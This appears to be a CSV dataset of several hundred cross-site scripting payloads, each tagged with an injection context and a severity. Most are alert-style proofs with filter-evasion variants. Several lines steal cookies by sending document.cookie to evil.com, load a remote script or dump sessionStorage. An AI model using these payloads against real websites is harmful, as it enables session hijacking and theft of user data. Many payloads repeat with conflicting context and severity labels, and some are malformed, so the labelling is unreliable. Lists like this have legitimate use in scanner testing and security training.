payload,context,severity
"""><SVG oNlOad=alErt(1)>",html_body,medium
"""></tag><svg onload=alert(1)>",html_body,medium
%3Csvg/onload=alert(1)%3E,tag_injection,medium
"\""><img src=x onerror=alert(1)>",attribute_escape,low
javascript:confirm(1),js_uri,high
"%20""><svg onload=alert(1)>",html_body,medium
"\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e",script_injection,high
<svg/onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,attribute_escape,medium
"""><svg onload=alert()>",html_body,medium
"<iframe src=""javascr/**/ipt:alert(1)"">",script_injection,medium
<SCRIPT>alert(document.domain)</SCRIPT>,script_injection,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
<svg////////onload=alert(1)>,html_body,medium
"\"" onerror=alert(1)//",attribute_escape,medium
alert(1),html_body,medium
"setTimeout(""alert(1)"",0)",dom_sink,high
"\""><img src=x onerror=al'+'ert(1)>",attribute_escape,high
<%= alert(1) %>,template_injection,high
<svg onload=alert(1)>,event_handler,high
<svg><a onload=alert(1)></a>,html_body,medium
<script>alert(1)</script>,script_injection,high
"\""><img src=x onerror=alert(1)>",template_injection,medium
confirm(),html_body,medium
<BODY ONLOAD=alert(’XSS’)>,html_body,medium
<svgonload=alert(1)>,html_body,medium
' onmouseover=alert(1) ',attribute,high
"""><img src=x onerror=alert(1)>",attribute,medium
<%= alert(1) %>,template_injection,medium
"""><svg onload=alert()>",html_body,medium
<BODY ONLOAD=alert(8839)>,html_body,medium
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,attribute_escape,high
<svgonload=alert(1)>,html_body,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,high
"alert(1))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
嘼img src=1 onchange=alert(1)嘾,attribute,medium
"document.body.innerHTML=""<img src=x onerror=\u0061\u006cert(1)>""",dom_sink,high
javascript:alert(1),js_uri,low
{{_c.constructor('alert(1)')()}},js_block,medium
<audio src/onerror=alert(1)>,html_body,medium
<ScRiPt>pRoMpT(1)</ScRiPt>,script_injection,low
<%= alert(1) %>,template_injection,low
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
"<iframe src=""javaSCRIPT:alert(1)"">",tag_injection,medium
' ><img src=x onload=alert(1)>,template_injection,low
"<object data=""javascr/**/ipt:alert(1)"">",js_uri,high
<script>prompt(1)</script>,script_injection,high
<%= alert(1) %>,tag_injection,medium
{{7*7}},template_injection,medium
javascript:alert(1),js_uri,medium
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
#{alert(1)},template_injection,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
<script>alert(document.domain)</script>,attribute_escape,high
%3cimg onerror=alert(1) src=a%3e,html_body,medium
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
"<embed src=""javascript:alert(1)"">",tag_injection,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
<svg/onload=alert(1)>,tag_injection,medium
onerror=alert(1);>,html_body,medium
onerror='alert(1)',html_body,medium
<img src/onerror=alert(1)>,html_body,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",attribute,high
<BODY ONLOAD=alert(8839)>,html_body,medium
"<iframe src=""javascript:confirm(1)"">",template_injection,medium
<video src=x onerror=alert(1)>,script_injection,high
"< script>alert(String.fromCharCode(88,83,83))</script>",attribute,high
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
<%= al'+'ert(1) %>,template_injection,medium
<marquee onstart=alert(1)>,event_handler,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,low
<marquee onstart=alert(1)>,attribute_escape,low
<details open ontoggle=confirm(1)>,event_handler,medium
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
' onload=alert(1) x=',attribute,medium
<scr/**/ipt>alert(document.domain)</scr/**/ipt>,template_injection,high
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",tag_injection,high
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
<script>d.innerHTML+='';</script>,js_block,high
<video src=x onload=alert(1)>,attribute,medium
<svgonload=alert(1)>,html_body,medium
alert(1),html_body,medium
<details open ontoggle=alert(1)>,event_handler,high
javascript:confirm(1),js_uri,low
"data:text/html,<script>alert(1)</script>",js_uri,low
"alert(1))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
</tag><svg onload=alert(1)>,attribute,medium
"<script	>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
"""+onblur=prompt(123)""+",attribute,medium
onwheel='alert(1)',attribute,medium
oNERrOR=AlERt(0);>,html_body,medium
<script>prompt(1)</script>,script_injection,medium
<body onload=alert(1)>,event_handler,low
"jAvAsCrIpT:VoId(dOcUmEnT.LoCaTiOn=""HtTp://eViL.CoM"")",script_injection,medium
嘼img src=1 onerror=alert(1)嘾,html_body,medium
%3Cimg%20src=xx%20onerror=alert(1)%3E,html_body,medium
"eval(""alert(1)"")",js_uri,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
<svg/onload=alert(1)>,tag_injection,low
<script>prompt(1)</script>,script_injection,medium
onerror=alert(0);>,html_body,medium
<svg on\u006co\u0061d=\u0061\u006cert(1)>,event_handler,medium
prompt(location.hash),html_body,medium
<svg><a onload=alert(1)></a>,html_body,medium
""" onfocus=alert(1) autofocus=""",attribute,high
"onbeforeinput=""alert(1)""",html_body,medium
<img/’onerror=alert(1) src=a>,html_body,medium
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
"%20""><svg onload=alert(1)>",html_body,medium
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
setInterval('ale'+'rt(10)');,html_body,high
<video src=x onerror=alert(1)>,event_handler,high
<script>alert(1)</script>,tag_injection,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
<svg////////onload=alert(1)>,html_body,medium
<BODY ONLOAD=alert(8839)>,html_body,medium
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
"""><svg onload=alert()>",html_body,medium
""" onload=alert(1) x=""",script_injection,high
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,html_body,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
"onload=""alert(1)""",html_body,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,attribute,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
' onload=alert(1) x=',attribute,high
<script>alert(document.domain)</script>,js_uri,high
\u003e\u003cimg src=1 onerror=confirm`1`\u003e,attribute,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
.alert(1);,html_body,medium
;alert(1);,html_body,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
' onmouseover=alert(1) ',attribute,low
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
"lOcAtIoN=""jAvAsCrIpT:AlErT(1)""",tag_injection,medium
${confirm(1)},js_uri,high
innerHTML=location.hash>#<marquee>alert(1)</script>,html_body,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
<img src=x onerror=alert(1)>,tag_injection,high
<svg onload=alert()>,html_body,medium
javaSCRIPT:alert(document.domain),js_uri,low
alert(1),html_body,medium
"< script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",js_block,high
{{constructor.constructor(‘a=document;window.alert(1)’)()}},js_string,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
"<object data=""javascript:alert(1)"">",attribute_escape,high
"<svg onload=""confirm(7)"">",html_body,medium
"javascript:void(document.location=""http://evil.com"")",event_handler,high
""" onerror=alert(1) x=""",attribute,low
< svgonload=alert(1)>,html_body,medium
"' onerror
=alert(	1) x
='",attribute,medium
""" onload=alert(1) x=""",attribute,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
"eval(""alert(1)"")",dom_sink,high
javascript:confirm(1),js_uri,medium
prompt(9),html_body,medium
"mrco24""type=image src onerror=""alert(1)""",html_body,medium
"\"" onerror=alert(1)//",event_handler,high
"<embed src=""javaSCRIPT:alert(1)"">",script_injection,medium
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,tag_injection,low
""" onerror=alert(1) x=""",attribute,medium
"\"" onerror=alert(1)//",attribute_escape,high
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
<svg/onload=alert(1)>,tag_injection,low
</tag><svg onload=alert(1)>,attribute,medium
\' onload=alert(1)//,attribute,high
""" onfocus=alert(1) autofocus=""",attribute,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
onload='self.alert(1)',html_body,medium
\' onerror=alert(1)//,attribute_escape,medium
onload&#61;'alert(1)',html_body,medium
"OnLOaD=""AlERt(1)""",html_body,medium
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,html_body,medium
onload='alert(1)',html_body,medium
<script>confirm(1)</script>,tag_injection,medium
<BODY ONLOAD=alert(8839)>,html_body,medium
"<object data=""javascript:alert(1)"">",tag_injection,medium
onerror=alert;throw 23;,html_body,low
"setTimeout(""alert(1)"",0)",event_handler,low
"setTimeout(""alert(1)"",0)",dom_sink,high
"<details open ontoggle
=alert(	1)>",event_handler,medium
\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,low
"location=""javascript:al'+'ert(1)""",dom_sink,high
j\u0061v\u0061script:confirm(1),js_uri,high
<img src=x onerror=alert(1)>,tag_injection,medium
<img/’onerror=alert(1) src=a>,html_body,medium
#{alert(1)},attribute,low
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,high
""" onload=alert(1) x=""",script_injection,high
javascript:alert(1),js_uri,low
"""><svg onload=alert(1)>",html_body,medium
<body onload=alert(1)>,event_handler,high
confirm(),html_body,medium
"\"" onerror=alert(1)//",attribute_escape,low
<svg/onload=alert(1)>,event_handler,low
"eval(""alert(1)"")",dom_sink,high
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",html_body,high
"eval(""alert(1)"")",attribute,low
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
[].sort.call`${alert}23`,js_string,low
"{{constructor.constructor('eval(atob(""YWxlcnQoMSk=""))')()}}",js_block,high
<img src/onerror=prompt(8)>,html_body,medium
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,high
""" onload
=alert(	1) x
=""",attribute,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
${alert(1)},template_injection,low
onload='confirm`1`',attribute,medium
<%= alert(1) %>,template_injection,medium
' onmouseover=alert(1) ',attribute,high
"location=""javascript:alert(1)""",event_handler,medium
<svgonload=alert(1)>,html_body,medium
<video src=x onload=alert(1)>,event_handler,medium
\' onerror=alert(1)//,attribute_escape,low
<svg/onload=confirm(1)>,tag_injection,medium
&quot; onerror=confirm(1) x=&quot;,attribute_escape,medium
<script>confirm(document.domain)</script>,template_injection,medium
\' onerror=alert(1)//,attribute_escape,medium
"<video>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
onload=”self.alert(1),html_body,medium
"""><marquee alert(String.fromCharCode(88,83,83))</script>",html_body,high
%3cimg onerror=alert(1) src=a%3e,html_body,medium
onerror='alert(1)',html_body,medium
\' onerror=alert(1)//,attribute_escape,low
onerror='alert(1)',html_body,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
"\""><img src=x onerror=alert(1)>",attribute_escape,high
"oneRrOr=""AleRt(1)""",html_body,medium
嘼img src=1 onerror=alert(1)嘾,attribute,medium
javascript:alert(1),url,medium
onerror='alert(1)',html_body,medium
"<iframe src=""javaSCRIPT:alert(1)"">",script_injection,low
<details open ontoggle=alert(1)>,event_handler,low
"data:text/html,<script>alert(1)</script>",js_uri,medium
prompt(9),html_body,medium
<marquee onstart=alert(1)>,tag_injection,medium
.alert(1);,html_body,medium
-alert(1)-',html_body,medium
<img src=x onerror=alert(1)>,tag_injection,high
"?alert(1)"",",html_body,medium
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
"""><iframe>alert(String.fromCharCode(88,83,83))</script>",html_body,high
\' onerror=al'+'ert(1)//,attribute_escape,low
"<embed src=""javascript:alert(1)"">",tag_injection,low
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
-alert(1)-',html_body,medium
-alert(23)/,html_body,medium
"setTimeout(""alert(1)"",0)",dom_sink,low
"onload=""prompt`1`""",html_body,medium
${alert(1)},template_injection,medium
OnlOAD='AlERT(1)',html_body,medium
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,html_body,medium
<script>confirm(1)</script>,script_injection,low
<script>alert(document.domain)</script>,script_injection,medium
"<svg onload=""confirm(7)"">",html_body,medium
onload='alert(1)',html_body,medium
alert(1);,html_body,medium
<BODY ONLOAD=alert(8839)>,html_body,medium
' onmouseover=alert(1) ',attribute,medium
"<embed src=""javascript:al'+'ert(1)"">",tag_injection,high
onload='alert(1)',html_body,medium
"onerror=""alert(1)""",html_body,medium
"location=""javascript:alert(1)""",event_handler,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
alert(1);,html_body,medium
"onerror=""window.alert(1)""",html_body,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,high
<script>alert(document.domain)</script>,script_injection,low
"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
<%= alert(1) %>,template_injection,low
"<embed src=""javascript:al'+'ert(1)"">",tag_injection,medium
onerror=alert(0);>,html_body,medium
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
' onmouseover=\u0061\u006cert(1) ',js_uri,low
#{aLeRt(1)},template_injection,low
\' onerror=alert(1)//,attribute_escape,low
"""><svg onload=alert(1)>",attribute,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
"<embed src=""javascript:alert(1)"">",tag_injection,low
"<svg onload=""confirm(7)"">",html_body,medium
"oNERROR=""alErT(1)""",html_body,medium
<img src/onerror=prompt(8)>,html_body,medium
"""></tag><svg onload=alert(1)>",html_body,medium
<img src/onerror=alert(1)>,html_body,medium
"&lt;embed src=""javascript:alert(1)""&gt;",attribute,high
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
prompt(9),html_body,medium
<script>confirm(1)</script>,script_injection,high
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
%3cimg onerror=alert(1) src=a%3e,html_body,medium
setInTeRvAl('aLE'+'rt(10)');,html_body,high
"document.write(""<img src=x onload=alert(1)>"")",template_injection,low
"OnerrOr=""AlErt(1)""",html_body,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
<img src=x onload=alert(1)>,attribute,high
"""><svg onload=alert()>",html_body,medium
<img src/onerror=prompt(8)>,html_body,medium
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,attribute,high
javascript:alert(document.domain),js_uri,high
javascript:alert(document.domain),js_uri,medium
""" onerror=\u0061\u006cert(1) x=""",attribute,medium
<img src=x onerror=alert(1)>,tag_injection,low
<svg/onload=confirm(1)>,attribute_escape,high
<%= alert(1) %>,template_injection,medium
alert(2),html_body,medium
"<embed src=""javaSCRIPT:alert(1)"">",tag_injection,medium
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
<img src=x onerror=alert(1)>,script_injection,medium
onload=”alert(‘AnonKryptiQuz’),html_body,medium
"onload=""alert(1)""",html_body,medium
{{7*7}},template_injection,high
<script>alert(1)</script>,script_injection,medium
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
"""><img src=x onerror=alert(1)>",attribute,low
"%3Ciframe src=""javascript:alert(1)""%3E",event_handler,low
<svg////////onload=alert(1)>,html_body,medium
confirm(),html_body,medium
<svg/onload=alert(1)>,event_handler,low
alert(1),html_body,medium
"location=""javascript:alert(1)""",dom_sink,low
onerror=alert(0);>,html_body,medium
${alert(	1)},template_injection,medium
onerror='alert(1)',html_body,medium
"eval(""alert(1)"")",dom_sink,medium
vbscript:confirm(1);,html_body,medium
<BODY ONLOAD=alert(8839)>,html_body,medium
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
"<iframe src=""javascript:alert(1)"">",tag_injection,low
<details open ontoggle=alert(1)>,attribute_escape,high
javascript:alert(1),dom_sink,medium
<script>confirm(1)</script>,script_injection,low
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
"<object data
=""javascript:alert(	1)"">",template_injection,high
"<svg onload=""confirm(7)"">",html_body,medium
""" onfocus=alert(1) autofocus=""",attribute,low
' onmouseover=alert(1) ',attribute,high
<img src/onerror=alert(1)>,html_body,medium
"""><sCRiPt>aLerT(StRInG.FrOMCHARCODE(88,83,83))</ScrIPt>",html_body,high
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
javascript:alert(1),url,medium
<details open ontoggle=confirm(1)>,dom_sink,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
<%= alert(1) %>,js_uri,medium
%3Cscript%3Econfirm(1)%3C/script%3E,script_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
\' onerror=alert(1)//,attribute_escape,high
<img src/onerror=alert(1)>,html_body,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
"ev\u0061\u006c(""\u0061\u006cert(1)"")",dom_sink,high
"setTimeout(""alert(1)"",0)",js_uri,low
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
""" onload=al'+'ert(1) x=""",attribute,high
<%= confirm(1) %>,template_injection,high
&quot; onerror=alert(1) x=&quot;,event_handler,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,medium
</tag><svg onload=alert(1)>,html_body,medium
ONErrOr=aleRt(0);>,html_body,medium
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",attribute,high
confirm(),html_body,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,medium
<ScRiPt>pRoMpT(1)</ScRiPt>,script_injection,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
</tag><svg onload=alert(1)>,html_body,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,tag_injection,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
"""><img src=x onbeforeinput=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",attribute,high
""" onload=alert(1) x=""",attribute,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
${\u0061\u006cert(1)},attribute_escape,medium
' onmouseover=alert(1) ',attribute,low
javascript:confirm(1),attribute,low
""">< script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"oNerrOr=""alErt(1)""",html_body,medium
alert(1);,html_body,medium
"onload=""alert(1)""",html_body,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"onerror=""alert(document.cookie)""",html_body,medium
<svg onload=alert()>,attribute,medium
"<embed src=""javascript:alert(1)"">",tag_injection,medium
onload='alert(1)',html_body,medium
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,medium
<img src=x onload=alert(1)>,tag_injection,medium
<image src/onerror=alert(1)>,html_body,medium
&quot; onerror=confirm(1) x=&quot;,attribute_escape,medium
"\""><img src=x onerror=alert(1)>",attribute_escape,medium
"prompt`1`)//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
"//"";ALeRT(sTRing.fROmChARCoDE(88,83,83))",html_body,high
"""><svg onload=alert()>",html_body,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
"{{constructor.constructor(""alert(1)"")()}}",template_injection,high
<image src/onerror=alert(1)>,html_body,medium
\u003e\u003cimg src=1 oncut=alert(0)\u003e,attribute,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
"eval(""alert(1)"")",attribute,high
"<iframe src=""javaSCRIPT:alert(1)"">",tag_injection,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
javascript:alert(document.domain),attribute_escape,medium
<IMG SRC=javascript:alert(document.cookie))>,url,high
"""><svg/ onload=alert()>",html_body,medium
"eval(""alert(1)"")",dom_sink,high
javascript:confirm(1),js_uri,medium
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",html_body,high
""" onerror=alert(1) x=""",attribute,low
{alert('document.cookie')},js_block,high
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
<script>confirm(1)</script>,script_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
<%= alert(1) %>,event_handler,medium
sEtinTeRvAL('Ale'+'Rt(10)');,html_body,high
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
"\"" onerror=alert(1)//",attribute_escape,medium
""" onerror=al'+'ert(1) x=""",event_handler,low
"<ScrIpT>D.iNNeRhtml+='';</ScrIPt>//[""'`-->]]>]</DIv>",html_body,high
"document.write(""<svg src=x onerror=alert(1)>"")",tag_injection,low
<svg><a onload=alert(1)></a>,html_body,medium
INNERhTml=locaTIoN.haSH>#<ScRiPt>aLerT(1)</scrIPt>,html_body,high
confirm(),html_body,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
<script>confirm(document.domain)</script>,script_injection,low
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
<SCRIPT>alert(document.domain)</SCRIPT>,event_handler,low
javascript:alert(document.domain),attribute,high
"""><marquee>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"""><svg onblur=alert()>",html_body,medium
\' onerror=alert(1)//,attribute_escape,high
""" oNlOaD=AlErT(1) x=""",template_injection,high
onfocus=”alert(‘AnonKryptiQuz’),html_body,medium
onerror='alert(1)',html_body,medium
onerror='alert(1)',html_body,medium
"' onerror
=alert(	1) x
='",attribute,medium
"{{constructor.constructor(""al'+'ert(1)"")()}}",template_injection,medium
<img/src/onerror=alert(1),attribute,medium
"data:text/html,<script>alert(1)</script>",js_uri,low
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
${alert(1)},attribute_escape,medium
<iframe/onload=alert(0);>,attribute,medium
"""><img src=x onload=alert(1)>",attribute,high
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
"<iframe src=""javascript:alert(1)"">",tag_injection,high
/*alert(1)*/,html_body,medium
javascript:confirm(1),js_uri,medium
"setTimeout(""alert(1)"",0)",dom_sink,high
"""><svg onload=alert()>",html_body,medium
"<svg//onload=alert(String.fromCharCode(88,83,83))>",html_body,high
"setTimeout(""alert(1)"",0)",dom_sink,high
onerror='alert(1)',html_body,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
<img/src=x onerror=alert(1)//>,dom_sink,high
%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E,dom_sink,low
\x3cscript\x3econfirm(1)\x3c/script\x3e,script_injection,high
""" OneRROR=alERt()1 a=""",attribute,medium
"?alert(1)"",",html_body,medium
"<object data=""javascript:alert(1)"">",tag_injection,medium
alert(1);,html_body,medium
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,html_body,high
< script>d.innerHTML+='';</script>,html_body,high
javascript:alert(1),js_uri,medium
<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,medium
innerHTML=location.hash>#< script>alert(1)</script>,html_body,high
"eval(""alert(1)"")",dom_sink,medium
${alert(1)},attribute_escape,medium
<img src=x onload=alert(1)>,event_handler,medium
"<iframe src=""javascript:alert(1)"">",tag_injection,medium
<image src/onerror=alert(1)>,html_body,medium
<script>\u0061\u006cert(document.dom\u0061in)</script>,script_injection,low
<marquee onstart=alert(1)>,script_injection,high
{{7*7}},template_injection,medium
"<embed src=""javascript:alert(1)"">",tag_injection,high
"location=""javascript:alert(1)""",attribute,low
//comment%0a%0dalert(0);,html_body,medium
javascript:alert(document.domain),js_uri,high
<img src/onerror=prompt(8)>,html_body,medium
\' onerror=confirm(1)//,attribute_escape,low
嘼img src=1 onerror=alert(1)嘾,html_body,medium
"\"" onerror=alert(1)//",js_uri,high
<body onload=alert(1)>,event_handler,medium
onerror=alert(0);>,html_body,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,high
<BODY ONLOAD=alert(8839)>,html_body,medium
' ><img src=x onerror=alert(1)>,attribute,high
eval(atob('YWxlcnQoKQ==')),js_block,high
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
%20%3Cimg%20src=1%20onerror=alert(1)%3E,html_body,medium
onload='alert(1)',html_body,medium
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,low
%3Cscript%3Efor((TESTAnonKryptiQuz)in(self))eval(TESTAnonKryptiQuz)(`${`TESTAnonKryptiQuz`}`)%3C/script%3E,js_string,low
{{7*7}},template_injection,low
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
"location=""javascript:confirm(1)""",js_uri,medium
